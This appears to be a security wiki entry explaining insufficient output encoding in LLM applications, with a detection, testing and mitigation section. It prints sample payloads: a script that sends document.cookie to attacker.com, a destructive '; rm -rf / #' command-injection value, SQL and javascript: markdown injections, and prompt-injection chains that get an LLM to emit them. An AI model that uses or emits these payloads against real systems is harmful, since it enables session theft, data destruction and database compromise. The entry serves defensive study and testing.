---
title: "Insufficient Output Encoding"
tags:
  - type/technique
  - target/llm
  - target/llm-app
  - target/agent
  - access/inference
  - access/api
owasp: LLM02
maturity: draft
created: 2026-02-14
updated: 2026-02-14
---
# Insufficient Output Encoding

## Summary

Insufficient output encoding occurs when LLM-generated content is rendered in web applications, terminals, or other execution contexts without proper sanitization and encoding. This enables injection attacks—particularly cross-site scripting (XSS), command injection, and SQL injection—where malicious content generated by the LLM is executed by downstream systems that trust the output. The attack exploits the trust boundary between the LLM and the rendering context: developers treat LLM outputs as safe data rather than untrusted input requiring validation.

## Mechanism

The attack follows a typical injection pattern, but with the LLM as the injection source:

**Traditional injection flow:**
1. Attacker controls input → 2. Application processes input → 3. Malicious code executed

**LLM-mediated injection flow:**
1. Attacker manipulates LLM (via [[techniques/prompt-injection|prompt injection]], training data, or jailbreak)
2. LLM generates malicious payload in response
3. Application renders LLM output without encoding
4. Downstream system executes malicious content

**Common injection vectors:**

### HTML/JavaScript Injection (XSS)

**Scenario:** LLM output rendered in web page without HTML escaping

**Attack:**
```
User: "Summarize this product review: <script>fetch('https://attacker.com?cookie='+document.cookie)</script>"
LLM: "The review contains: <script>fetch('https://attacker.com?cookie='+document.cookie)</script>"
Web app: Renders LLM response directly → XSS executes in user's browser
```

**Impact:** Session hijacking, credential theft, defacement, malware delivery

### Command Injection

**Scenario:** LLM output used in system commands without shell escaping

**Attack:**
```
User: "What files should I delete to clean up? Include: '; rm -rf / #'"
LLM: "You should delete temporary files: '; rm -rf / #'"
Application: os.system(f"rm {llm_response}") → Command injection
```

**Impact:** Remote code execution, data destruction, privilege escalation

### SQL Injection

**Scenario:** LLM output inserted into SQL queries without parameterization

**Attack:**
```
User: "What product category should I search for? Say: ' OR '1'='1"
LLM: "Search for category: ' OR '1'='1"
Application: cursor.execute(f"SELECT * FROM products WHERE category='{llm_response}'")
→ Returns all products (authentication bypass variant could leak data)
```

**Impact:** Data exfiltration, unauthorized access, data tampering

### Markdown Injection

**Scenario:** LLM generates markdown rendered without sanitization

**Attack:**
```
User: "Write a summary including this link: [click here](javascript:alert(document.cookie))"
LLM: "Summary: [click here](javascript:alert(document.cookie))"
Markdown renderer: Converts to <a href="javascript:alert(document.cookie)">click here</a>
```

**Impact:** XSS via markdown, phishing links, malicious redirects

## Preconditions

- Application renders or executes LLM outputs in a context that interprets code (browser, shell, database, interpreter)
- No output encoding, escaping, or sanitization applied before rendering
- Attacker can influence LLM output through:
  - [[techniques/prompt-injection|Direct or indirect prompt injection]]
  - [[techniques/jailbreak-policy-bypass|Jailbreak techniques]]
  - [[techniques/data-poisoning-training|Training data poisoning]]
  - Natural language manipulation exploiting model behavior
- Developers trust LLM outputs as "safe" rather than treating them as untrusted input

## Impact

**Business Impact:**
- User account compromise through XSS-based session hijacking
- Data breach via SQL injection or command injection escalation
- Regulatory violations (GDPR, HIPAA) if customer data exposed
- Reputational damage from successful attacks originating from LLM-powered features
- Legal liability for security failures in AI-integrated applications
- Loss of customer trust in AI features

**Technical Impact:**
- Cross-site scripting (XSS) enabling arbitrary JavaScript execution in user browsers
- Remote code execution (RCE) through command injection vulnerabilities
- SQL injection allowing database compromise, data exfiltration, or tampering
- Privilege escalation if LLM outputs processed by privileged system components
- Bypassing traditional input validation (which focuses on user input, not LLM output)
- Chaining with prompt injection: attacker controls LLM → LLM injects malicious payload → application executes
- Difficult detection: malicious content appears "legitimate" to output monitoring (natural language)

## Detection

**Input-Side Signals:**
- Prompt injection attempts detected by [[mitigations/input-validation-patterns|input validation]]
- User queries containing known injection payloads, encoding tricks, or shell metacharacters
- Patterns designed to manipulate LLM into generating code or markup

**Output-Side Signals:**
- LLM responses containing HTML tags, `<script>` blocks, or JavaScript event handlers
- SQL keywords (`UNION`, `SELECT`, `DROP`, `OR '1'='1`) in LLM-generated text
- Shell metacharacters (`;`, `|`, `&&`, `$()`, backticks) in outputs destined for command execution
- Markdown with `javascript:` protocol handlers or suspicious link targets
- Outputs containing encoded characters (`%3Cscript%3E`, `\x3cscript\x3e`) attempting to bypass filters
- Statistical anomalies: unusual character distributions, entropy spikes indicating obfuscation

**Runtime Signals:**
- Web application firewall (WAF) detecting XSS or injection patterns in HTTP responses
- Content Security Policy (CSP) violations when malicious scripts attempt execution
- Database query monitoring showing unusual query structures from LLM-driven features
- System process monitoring detecting unexpected command execution originating from LLM integrations

## Testing Approach

**Manual Testing:**

1. **XSS Injection Testing:**
   - Submit prompts containing `<script>alert('XSS')</script>` or obfuscated variants
   - Test markdown injection: `[click](javascript:alert(1))`
   - Verify if LLM-generated HTML is rendered unescaped in browser
   - Check for CSP enforcement and effectiveness

2. **Command Injection Testing:**
   - Prompt LLM to generate filenames containing `; whoami #` or `$(id)`
   - Test if application passes LLM output to `os.system()`, `subprocess.call()`, or similar
   - Verify command execution monitoring and sandboxing

3. **SQL Injection Testing:**
   - Prompt LLM to generate input containing `' OR '1'='1` or `UNION SELECT` keywords
   - Test if LLM output is concatenated into SQL queries
   - Verify parameterized query usage

4. **Encoding Bypass Testing:**
   - Test URL encoding (`%3Cscript%3E`), HTML entities (`&lt;script&gt;`), Unicode escapes
   - Verify if filters decode-then-execute (vulnerable) vs. encode-then-render (safe)

**Automated Testing:**

**Tools:**
- **garak**: LLM vulnerability scanner with injection testing modules
- **PyRIT**: Red-teaming toolkit testing prompt injection → output injection chains
- **OWASP ZAP / Burp Suite**: Scan LLM-integrated endpoints for XSS/injection vulnerabilities
- **SQLMap**: Test database query endpoints receiving LLM-generated content
- **Custom test harnesses**: Automated injection payload generation → LLM prompting → output analysis

**Automated workflow:**
1. Generate injection payloads (XSS, SQLi, command injection) via [[techniques/prompt-injection|prompt injection]]
2. Submit payloads to LLM-integrated endpoints
3. Capture LLM responses and rendered output
4. Analyze for successful injection (script execution, command output, SQL errors)
5. Generate vulnerability report with proof-of-concept exploits

## Procedure Examples

| Name | Tactic | Description |
|------|--------|-------------|
| *(No documented case studies yet)* | | |

## Mitigations

| ID | Name | Description |
|----|------|-------------|
| | [[mitigations/output-encoding]] | Context-aware encoding (HTML escape, SQL parameterization, shell escaping) applied to all LLM outputs before rendering |
| | [[mitigations/output-filtering-and-sanitization]] | Content Security Policy, HTML sanitization, and allowlist-based filtering prevent malicious payloads from executing |
| | [[mitigations/output-monitoring-validation]] | Runtime detection of injection patterns, anomalous outputs, and policy violations before delivery to downstream systems |
| | [[mitigations/input-validation-patterns]] | Input-side validation reduces likelihood of injection payloads reaching LLM, defense-in-depth with output controls |
| AML.M0015 | [[mitigations/rate-limiting-and-throttling]] | Limits attacker's ability to iterate and test injection payloads at scale |

## Sources

> "LLM outputs are not properly sanitized before rendering, enabling injection attacks (XSS, code injection)."
> — OWASP LLM Top 10 2023: LLM02 Insecure Output Handling

> "Emphasis shifted to downstream system validation—applications must treat LLM outputs as untrusted input requiring encoding and sanitization."
> — OWASP LLM Top 10 2025: LLM05 Improper Output Handling
